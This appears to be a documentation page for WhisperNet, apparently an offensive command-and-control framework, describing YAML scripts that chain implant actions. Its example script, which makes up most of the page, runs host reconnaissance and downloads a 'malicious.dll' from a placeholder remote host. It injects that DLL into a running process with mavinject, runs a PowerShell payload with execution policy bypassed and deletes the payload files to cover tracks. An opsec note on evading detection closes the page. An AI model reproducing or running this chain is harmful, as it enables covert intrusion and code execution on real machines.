# Command Extension Scripts

WhisperNet provides extensibility for commands using a **YAML-based** system, allowing you to define automated actions in sequence.

---

## Example Script

```yaml
commands:
  - command: recon
    actions:
      - command: shell
        args: whoami /all

      - command: shell
        args: ipconfig /all

      - command: shell
        args: netstat -ano

  - command: inject_dll
    actions:
      - command: get_file
        args: http://someip/malicious.dll C:\malicious.dll

      - command: start-process
        args: mavinject <PID> /INJECTRUNNING C:\malicious.dll


  - command: deploy_payload
    actions:
      - command: upload
        args: C:\temp\payload.bin /var/www/html/payload.bin

      - command: shell
        args: powershell -ExecutionPolicy Bypass -File C:\temp\payload.ps1

  - command: clean_up
    actions:
      - command: shell
        args: del /Q C:\temp\payload.bin

      - command: shell
        args: del /Q C:\temp\payload.ps1
```

---

## Opsec considerations:

Loading the scripts themselves has zero OPSEC impact. However, the commands within the scripts can have significant OPSEC implications depending on how they are configured and executed.

### **Key Features:**
- **YAML-Based:** Easily readable and modifiable command execution.
- **Multi-Step Actions:** Define multiple sequential steps under a single command.
- **Modular Design:** New commands can be added with ease.

